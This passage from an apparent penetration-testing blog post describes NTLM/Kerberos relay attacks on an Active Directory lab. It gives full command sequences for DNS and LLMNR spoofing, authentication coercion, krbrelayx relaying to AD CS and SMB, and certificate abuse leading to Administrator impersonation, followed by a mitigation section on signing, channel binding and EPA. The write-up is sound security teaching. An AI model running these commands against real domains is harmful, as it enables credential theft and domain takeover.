He also showed that if we register the DNS record fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA, the client would ask a Kerberos ticket for cifs/fileserver but would connect to fileserver1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAfileserversBAAAA.
</blockquote>

<p style="margin-bottom:0.25em">
We need to follow these steps:
</p>
1. Add a crafted DNS record: `<target>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` (or set up for LLMNR spoofing)
2. Coerce DC1 to authenticate to the crafted hostname
3. Relay the AP_REQ

```sh
# Add a DNS record
python3 dnstool.py -u kawakatz.local\\coward -p 'P@ssw0rd' -r ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA -d <attacker ip> -a add <dc ip>
# or perform LLMNR spoofing as before
# pretender: https://github.com/RedTeamPentesting/pretender
sudo ./pretender -i ens33 --no-dhcp-dns --no-timestamps --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*' -4 <attacker ip>

# Kerberos relay over SMB to HTTP
sudo python3 krbrelayx.py -smb2support -t http://ca.kawakatz.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication
coercer coerce -u coward -p 'P@ssw0rd' -d kawakatz.local -t dc1.kawakatz.local -l ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA

# Abuse an issued certificate as before
python3 gettgtpkinit.py -pfx-base64 MII...MN+jt 'kawakatz.local/DC1$' DC1.ccache
python3 gets4uticket.py 'kerberos+ccache://kawakatz.local\dc1$:DC1.ccache@dc1.kawakatz.local' cifs/dc1.kawakatz.local@kawakatz.local Administrator@kawakatz.local /tmp/Administrator.ccache
export KRB5CCNAME=/tmp/Administrator.ccache
python3 smbclient.py -k -no-pass kawakatz.local/Administrator@dc1.kawakatz.local
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/22.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Adding a DNS record</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/23.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over SMB to HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/24.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Obtaining a ticket</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/26.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Impersonating Administrator</div>
</div>

#### Reflective NTLM/Kerberos Relay over SMB
It’s worth noting CVE-2025-33073, introduced in ["A Look in the Mirror - The Reflective Kerberos Relay Attack"](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/).

So far, some patches have prevented reflective NTLM relay. However, reflective NTLM/Kerberos relay was possible until June 2025, when it was fixed as CVE-2025-33073. The vulnerability is based on the trick of Kerberos relay over SMB. The details are described in ["NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) by Synacktiv. We simply need to coerce authentication to a crafted hostname that confuses SMB clients.

Note that krbrelayx.py needs to be patched as described in the white paper ["Reflective Kerberos Relay Attack"](https://www.redteam-pentesting.de/publications/2025-06-11-Reflective-Kerberos-Relay-Attack_RedTeam-Pentesting.pdf).
```sh
# Use LLMNR
sudo ./pretender -i ens33 --no-dhcp-dns --no-timestamps --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*' -4 <attacker ip>
# or add a DNS record
python3 dnstool.py -u kawakatz.local\\coward -p 'P@ssw0rd' -r dc11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA -d <attacker ip> -a add <dc ip>

# Reflective Kerberos relay over SMB to SMB
sudo python3 krbrelayx.py -t smb://dc1.kawakatz.local -c 'whoami'
coercer coerce -u coward -p 'P@ssw0rd' -d kawakatz.local -t dc1.kawakatz.local -l dc11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/33.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing Kerberos authentication over SMB</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/32.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">LLMNR spoofing</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/34.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Reflective Kerberos relay over SMB to SMB</div>
</div>

<p style="margin-bottom:0.25em">
Surprisingly, we can also use ntlmrelayx.py as described in <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">"NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073"</a>. The crafted hostname triggers NTLM local authentication and the behavior gives us high privileges because:
</p>
<blockquote style="margin-top:.5em">
The last question is: why are we privileged on the machine? Well, PetitPotam coerces lsass.exe into authenticating to our server and lsass.exe runs as SYSTEM.
</blockquote>

To abuse this behavior, @decoder_it introduced [a relay technique](https://x.com/decoder_it/status/1981806629650649408) to LDAP/LDAPS by dropping the MIC for direct privilege escalation to Domain Admin.

<p style="margin-bottom:0.25em">
Since a patch for CVE-2025-33073 made this technique unusable, as described below by Synacktiv, there are currently no known ways to perform Kerberos relay over SMB😢. The coercion technique no longer works and no SMB traffic occurs.
</p>
<blockquote style="margin-top:.5em">
Therefore, this call was added to prevent any SMB connection if the use of a target name with marshalled target information was detected. Therefore, this patch prevents the exploitation of the vulnerability by removing the ability to coerce machines into authenticating via Kerberos by registering a DNS record with marshalled target information.
</blockquote>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/60.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercion with the trick before patching (works)</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/61.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercion with the trick after patching (does not works)</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/62.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Normal coercion after patching (still works)</div>
</div>

## Kerberos Relay over HTTP
Kerberos relay over HTTP was introduced in ["Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx"](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with). A key trick of this relay is that HTTP clients construct the SPN based on the answer name from LLMNR.

#### Prerequisites
We must be able to perform LLMNR spoofing.

#### Examples
When an HTTP client tries to access unresolvable hosts (due to a typo or by abusing the WebClient service), we can perform LLMNR spoofing to respond with a target answer name. The answer name in LLMNR is used to construct the SPN, such as HTTP/ca.kawakatz.local. The client then sends the AP_REQ to us, enabling Kerberos relay.
```sh
# forked Responder: https://github.com/lgandx/Responder
# Disable mDNS and NBT-NS
sudo vim Responder.conf
# Setup Responder 
sudo python3 Responder.py -I ens33 -N ca

# Kerberos relay to HTTP
sudo python3 krbrelayx.py -smb2support -t http://ca.kawakatz.local/certsrv/certfnsh.asp --adcs --template Machine
python3 PetitPotam.py -d kawakatz.local -u coward -p 'P@ssw0rd' nonexist@80/test wks.kawakatz.local

# Abuse the certificate as above...
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/41.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Coercing Kerberos authentication over HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/42.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">LLMNR spoofing with spoofed answer name</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/43.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over HTTP to HTTP</div>
</div>

## Kerberos Relay to SMB and LDAP/LDAPS
Kerberos relay to SMB also works straightforwardly.
```sh
# Kerberos relay to SMB
sudo python3 krbrelayx.py -smb2support -t smb://dc2.kawakatz.local --enum-local-admins
```
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/64.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over DNS to SMB</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/65.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Kerberos relay over HTTP to SMB</div>
</div>

<p style="margin-bottom:0.25em">
On the other hand, even using Kerberos authentication over HTTP, we cannot relay it to LDAP/LDAPS regardless of service settings. According to <a href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">the article</a> by Synacktiv,
</p>
<blockquote style="margin-top:.5em">
When the Negotiate security package (WWW-Authenticate : Negotiate) is used to perform Kerberos authentication, the resulting AP-REQ will by default enable integrity protections.
</blockquote>

We can verify the behavior, and we can see that krbrelayx.py cannot continue the LDAP session. This is a common limitation across all Kerberos relaying techniques (over HTTP, DNS, and SMB). Without the session key from the AP-REQ, we cannot sign LDAP messages, so the server rejects the session after initial authentication.
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/63.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP session by krbrelayx.py</div>
</div>

## Mitigations
#### SMB
<p style="margin-bottom:0.25em">
You need to require SMB signing on all servers and clients.  
</p>
```registry
Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options  
Policy: Microsoft network server: Digitally sign communications (always)
Value:  Enabled
```
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/67.png" width="650" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing SMB signing</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/74.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">SMB signing is required</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/75.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to SMB failed</div>
</div>

#### LDAP/LDAPS
<p style="margin-bottom:0.25em">
You need to require LDAP signing and LDAP channel binding.  
</p>
```registry
Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options  
Policy: Domain controller: LDAP server signing requirements
Value:  Require signing
```
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/69.png" width="650" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing LDAP signing</div>
</div>

```registry
Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options  
Policy: Domain controller: LDAP server channel binding token requirements
Value:  Always
```
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/68.png" width="650" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing LDAP channel binding</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/76.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">LDAP signing and LDAP channel binding are required</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/77.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to LDAP failed</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/78.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to LDAPS failed</div>
</div>

#### HTTP/HTTPS
You need to disable HTTP and require EPA on HTTPS.
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/70.png" width="600" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Disabling HTTP</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/71.png" width="580" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Enforcing EPA</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/79.png" width="550" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">HTTP is disabled and EPA is required</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/80.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to HTTPS failed</div>
</div>

#### WinRMS
You need to update CbtHardeningLevel to "Strict".
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/72.png" width="700" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Update CbtHardeningLevel</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/81.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to WinRMS failed</div>
</div>

#### MSSQL
You need to required EPA on all servers.
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/73.png" width="600" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Require EPA</div>
</div>
<div style="text-align: center; margin: 20px 0;">
  <img src="/assets/img/20251029/82.png" width="800" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">NTLM relay to MSSQL failed</div>
</div>

#### Others
<p style="margin-bottom:0.25em">
You also need to disable NTLMv1.  
</p>
```registry
Path:   Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options  
Policy: Network security: LAN Manager authentication level  
Value:  Send NTLMv2 response only. Refuse LM & NTLM
```
<div style="text-align: center; margin: -1em 0 20px 0;">
  <img src="/assets/img/20251029/83.png" width="650" style="border: 1px solid black;" alt=""/>
  <div style="font-style: italic; color: #666; margin-top: 0px;">Disable NTLMv1</div>
</div>

<p style="margin-bottom:0.25em">
Other recommended mitigations:
</p>
- Disable LLMNR (and NBT-NS)
- Disable the WebClient service
- Set Machine Account Quota to 0
- Apply security patches regularly

## Conclusion
In this blog, I summarized NTLM/Kerberos relay attacks. I hope you find this useful.
